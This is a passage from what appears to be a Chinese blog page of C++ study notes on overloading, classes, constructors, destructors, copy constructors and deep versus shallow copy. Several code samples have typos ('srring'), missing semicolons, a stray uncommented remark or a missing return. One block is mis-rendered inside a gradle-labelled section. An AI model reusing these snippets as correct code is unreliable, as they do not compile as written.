class="hljs-comment">//必须填补那个占位的</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>占位参数还可以有默认参数，比如</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> = <span class="hljs-number">10</span>)</span><span class="hljs-comment">//第二个int就是来占位的</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//必须填补那个占位的</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>作用：<ul><li>函数名可以相同，提高重用性</li></ul></li><li>条件：<ul><li>同一个作用域（比如都是全局）</li><li>函数名相同</li><li>函数参数<strong>类型不同</strong>或<strong>个数不同</strong>或<strong>顺序不同</strong></li></ul></li><li>注意：<ul><li><strong>函数返回值不可作为函数重载的条件</strong></li></ul></li></ul><p>举个例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><span class="hljs-comment">//参数个数不同</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func()被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<br><span class="hljs-built_in">func</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>引用作为函数重载的条件</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int &amp;a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(const int &amp;a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-built_in">func</span>(a);<span class="hljs-comment">//调用了第一个</span><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//调用了第二个</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>函数重载碰到默认参数</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int a)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b=<span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;func(int a,int b=10)被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//func(10);//错误的</span><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>);<span class="hljs-comment">//正确的</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>C++面向对象三大特性：封装、继承、多态</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><h3 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h3><ul><li>将属性和行为封装在一起，表现事物</li><li>将属性和行为加以权限控制</li></ul><p><strong>意义1：</strong></p><ul><li>语法：<code>class 类名&#123; 属性、行为 &#125;</code></li></ul><p>比如设计一个圆类，求圆周长</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span><br>&#123;<br><span class="hljs-comment">//访问权限</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//属性</span><br><span class="hljs-type">int</span> r;<br><span class="hljs-comment">//行为</span><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">c</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*<span class="hljs-number">3.14</span>*r;<br>&#125;<br>&#125;;<span class="hljs-comment">//注意这里有一个分号</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-comment">//通过圆类创建一个对象</span><br>     Circle c1;<br>     <span class="hljs-comment">//赋予属性</span><br>     c<span class="hljs-number">1.</span>r=<span class="hljs-number">10</span>;<br>     cout&lt;&lt;<span class="hljs-string">&quot;圆周长为&quot;</span>&lt;&lt;c<span class="hljs-number">1.</span><span class="hljs-built_in">c</span>()&lt;&lt;endl;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>类中的属性行为统一称为成员</p><p>属性：成员属性，成员变量</p><p>行为：成员函数，成员方法</p><p><strong>意义2：</strong></p><p>访问权限分为3种</p><ul><li>public 公共权限<ul><li>类内类外均可访问</li></ul></li><li>protected 保护权限<ul><li>类内可访问</li><li>类外不可访问</li><li>子可访问父</li></ul></li><li>private 私有权限<ul><li>类内可访问</li><li>类外不可访问</li><li>子不可访问父亲</li></ul></li></ul><h3 id="struct-class区别"><a href="#struct-class区别" class="headerlink" title="struct class区别"></a>struct class区别</h3><p>唯一区别：默认访问权限不同</p><p>struct：公共</p><p>class：私有</p><h3 id="将成员属性设置为私有"><a href="#将成员属性设置为私有" class="headerlink" title="将成员属性设置为私有"></a>将成员属性设置为私有</h3><p>优点1：将所有成员属性设置为私有，可以自己控制读写权限</p><p>优点2：对于写权限，我们可以检查数据有效性（就是在写的时候加if来判断即可）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setname</span><span class="hljs-params">(string n)</span></span><br><span class="hljs-function"></span>&#123;<br>name=n;<br>&#125;<span class="hljs-comment">//这样就是可读可写</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getage</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;年龄为：&quot;</span>&lt;&lt;age&lt;&lt;endl;<br>&#125;这样就是只读了<br><span class="hljs-function">string <span class="hljs-title">setidol</span><span class="hljs-params">(string i)</span></span><br><span class="hljs-function"></span>&#123;<br>idol=i;<br>&#125;<span class="hljs-comment">//这样就是只写了</span><br><span class="hljs-keyword">private</span>:<br>string name;<span class="hljs-comment">//姓名，可读可写</span><br><span class="hljs-type">int</span> age=<span class="hljs-number">18</span>;<span class="hljs-comment">//年龄 只读</span><br>srring idol;<span class="hljs-comment">//偶像 只写</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="对象的初始化和清理"><a href="#对象的初始化和清理" class="headerlink" title="对象的初始化和清理"></a>对象的初始化和清理</h2><h3 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h3><p><strong>初始化</strong>和<strong>清理</strong>是非常重要的安全问题</p><ul><li>没有初始化，对象使用后果是位置的</li><li>使用完对象或变量没有及时清理，也会造成安全问题</li></ul><p>构造和析构就是来解决初始化和清理的，由编译器自动调用，<strong>如果我们不提供构造和析构，编译器会提供，但编译器提供的是空的</strong></p><ul><li>构造：主要作用在创建对象时为成员属性赋值，由编译器自动调用，无须手动</li><li>析构：主要作用在于对象销毁前自动调用，执行一些清理</li></ul><p>构造函数语法：<code>类名 ()&#123;&#125;</code></p><ul><li>没有返回值也不写void</li><li>函数名称和类名相同</li><li>可以有参数，因此可以发生重载</li><li>程序在调用对象的时候会自动调用构造，无须手动调用，而且只会调用一次</li></ul><p>析构函数语法：<code>~类名 ()&#123;&#125;</code></p><ul><li>没有返回值但也不写void</li><li>函数名称和类名相同，在名称前面加~</li><li><strong>不可以</strong>有参数，因此<strong>不可以</strong>发生重载</li><li>程序在对象销毁前会自动调用析构，无须手动调用且只会调用一次</li></ul><p>举例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<span class="hljs-comment">//构造函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;Person构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">person</span>()<span class="hljs-comment">//析构函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;person析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p;<span class="hljs-comment">//栈上的数据，执行完毕后会释放这个对象，也就会执行析构函数</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test1</span>();<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="构造函数的分类及调用"><a href="#构造函数的分类及调用" class="headerlink" title="构造函数的分类及调用"></a>构造函数的分类及调用</h3><p>分类：</p><ul><li>按参数<ul><li>有参构造和无参构造</li></ul></li><li>按类型<ul><li>普通构造和拷贝构造</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<span class="hljs-comment">//无参构造函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;Person无参构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a)<span class="hljs-comment">//有参构造函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;Person有参构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>     <span class="hljs-comment">//拷贝构造函数</span><br>     <span class="hljs-comment">//将传入的对象身上的属性拷贝到我当前的对象上</span><br>     <span class="hljs-built_in">person</span>(<span class="hljs-type">const</span> person &amp;p)<br>     &#123;<br>          cout&lt;&lt;<span class="hljs-string">&quot;Person拷贝&quot;</span>&lt;&lt;endl;<br>          age=p.age<br>     &#125;<br>~<span class="hljs-built_in">person</span>()<span class="hljs-comment">//析构函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;person析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-type">int</span> a;<br>&#125;;<br></code></pre></td></tr></table></figure><p>调用方式：</p><ul><li>括号法<ul><li>注意事项<ul><li>调用默认构造函数时不要加()，<code>person p1()</code>会被当做是一个函数的声明</li></ul></li></ul></li><li>显示法<ul><li>不要利用拷贝构造函数初始化匿名对象</li></ul></li><li>隐式转换法</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-comment">//括号法</span><br>     person p;<span class="hljs-comment">//默认构造函数调用</span><br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<span class="hljs-comment">//括号法调用有参</span><br>     <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<span class="hljs-comment">//括号法调用拷贝</span><br>     <span class="hljs-comment">//显示法</span><br>     person p3=<span class="hljs-built_in">person</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//显示法调用有参构造</span><br>     person p4=<span class="hljs-built_in">person</span>(p1);<span class="hljs-comment">//显示法调用拷贝构造</span><br>     <span class="hljs-built_in">person</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//匿名对象，当前执行结束后会立即释放掉</span><br>     <span class="hljs-comment">//隐式转换法</span><br>     person p5=<span class="hljs-number">10</span>;<span class="hljs-comment">//相当于person p5=person(10)</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="拷贝构造函数调用时机"><a href="#拷贝构造函数调用时机" class="headerlink" title="拷贝构造函数调用时机"></a>拷贝构造函数调用时机</h3><p>调用的三种情况</p><ul><li>调用一个已经创建完毕的对象来初始化新对象</li><li>值传递方式给函数参数传值</li><li>以值传递方式返回局部对象</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;默认构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a)<br>&#123;<br>age=a;<br>cout&lt;&lt;<span class="hljs-string">&quot;有参构造被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">person</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">const</span> person &amp;p)<br>&#123;<br>age=p.age;<br>cout&lt;&lt;<span class="hljs-string">&quot;拷贝构造被调用&quot;</span>&lt;&lt;endl<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">work1</span><span class="hljs-params">(person p)</span></span><br><span class="hljs-function"></span>&#123;<br>     <br>&#125;<br><span class="hljs-function">person <span class="hljs-title">work2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p1;<br>     <span class="hljs-keyword">return</span> p1;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">20</span>)</span></span>;<br>     <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<span class="hljs-comment">//第一种调用情况</span><br>     <span class="hljs-built_in">work1</span>(p1);<span class="hljs-comment">//第二种调用情况，拷贝出临时的副本给函数用</span><br>     person p=<span class="hljs-built_in">work2</span>();<span class="hljs-comment">//第三种调用情况，return时会拷贝一个新对象给p</span><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="构造函数调用规则"><a href="#构造函数调用规则" class="headerlink" title="构造函数调用规则"></a>构造函数调用规则</h3><p>默认情况下，c++编译器至少给一个类添加三个函数</p><ul><li>默认构造函数（无参，函数体为空）</li><li>默认析构函数（无参，函数体为空）</li><li>默认拷贝函数，对属性进行值拷贝</li></ul><p>构造函数调用规则：</p><ul><li>用户自定义<strong>有参构造</strong>函数，C++不在提供默认无参构造，但是会提供默认拷贝函数</li><li>用户自定义<strong>拷贝构造</strong>函数，C++不再提供其他的构造函数</li></ul><h3 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h3><p>浅拷贝：简单赋值操作</p><p>深拷贝：在堆区重新申请空间，进行拷贝操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;默认构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> h)<br>&#123;<br>age=a;<br>          high=<span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(h);<br>cout&lt;&lt;<span class="hljs-string">&quot;有参构造被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">person</span>()<br>&#123;<br>          <span class="hljs-comment">//析构函数，将堆区开辟的数据释放掉</span><br>          <span class="hljs-keyword">if</span> (high!=<span class="hljs-literal">NULL</span>)<br>               <span class="hljs-keyword">delete</span> high;<br>cout&lt;&lt;<span class="hljs-string">&quot;析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br>     <span class="hljs-type">int</span> age;<br>     <span class="hljs-type">int</span>* high=<span class="hljs-literal">NULL</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>浅拷贝会导致一块内存重复被释放</p><ul><li><pre><code class="c++">int main()&#123;    person p1(18,120);    person p2(p1);//系统提供的拷贝函数，是浅拷贝    return 0;&#125;//此时p1p2中的age存储的是同一块堆中的地址，当p2结束后会执行一次析构函数，此时high已经被释放掉，而p1结束后还会再来一次析构函数，而此时已经释放掉的内存就会再一次被释放，导致程序出错<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>此时就需要深拷贝，需要重新申请一块内存<br><br>```c++<br><span class="hljs-keyword">class</span> person<br>&#123;<br><span class="hljs-keyword">public</span>:<br>person()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;默认构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>person(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> h)<br>&#123;<br>age=a;<br>          high=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>(h);<br>cout&lt;&lt;<span class="hljs-string">&quot;有参构造被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~person()<br>&#123;<br>          <span class="hljs-comment">//析构函数，将堆区开辟的数据释放掉</span><br>          <span class="hljs-keyword">if</span> (high!=<span class="hljs-keyword">NULL</span>)<br>               <span class="hljs-keyword">delete</span> high;<br>cout&lt;&lt;<span class="hljs-string">&quot;析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>     <span class="hljs-comment">//深拷贝</span><br>     person(const person &amp;p)<br>     &#123;<br>          cout&lt;&lt;<span class="hljs-string">&quot;深拷贝函数被调用&quot;</span>&lt;&lt;endl;<br>          age=p.age;<br>          <span class="hljs-comment">//high=p.high;  编译器默认提供的拷贝函数就是这句代码</span><br>          high=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>(*p.high);<br>     &#125;<br><span class="hljs-keyword">private</span>:<br>     <span class="hljs-keyword">int</span> age;<br>     <span class="hljs-keyword">int</span>* high=<span class="hljs-keyword">NULL</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="初始化列表"><a href="#初始化列表" class="headerlink" title="初始化列表"></a>初始化列表</h3><p><strong>作用</strong>：</p><p>C++提供初始化列表语法，用于初始化属性</p><p>语法：<code>构造函数():属性1(值1),属性2(值2)....&#123;&#125;</code></p><p>参数非常数时：<code>person(int a,int b,int c):m_A(a),m_B(b),m_C(c)&#123;&#125;</code></p><h3 id="类对象作为类成员"><a href="#类对象作为类成员" class="headerlink" title="类对象作为类成员"></a>类对象作为类成员</h3><p>C++中类中的成员可以是另一个类的对象，我们称该成员为：<strong>对象成员</strong></p><p>比如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span><br>&#123;<br>A a;<br>&#125;;<br></code></pre></td></tr></table></figure><p>B中有对象A作为成员，A是对象成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">phone</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">phone</span>(string p)<br>&#123;<br>pname=p;<br>&#125;<br>string pname;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>(string n,string pn)<br>&#123;<br>name=n;<br>m_phone.pname=pn;<br>&#125;<br>srring name;<br>phone m_phone;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">person <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-string">&quot;pp&quot;</span>,<span class="hljs-string">&quot;apple&quot;</span>)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>结论：当其他类对象作为本类对象，<strong>其他类的构造函数先被调用，然后自身的构造函数再来，析构则是反过来</strong></p><h3 id="静态成员"><a href="#静态成员" class="headerlink" 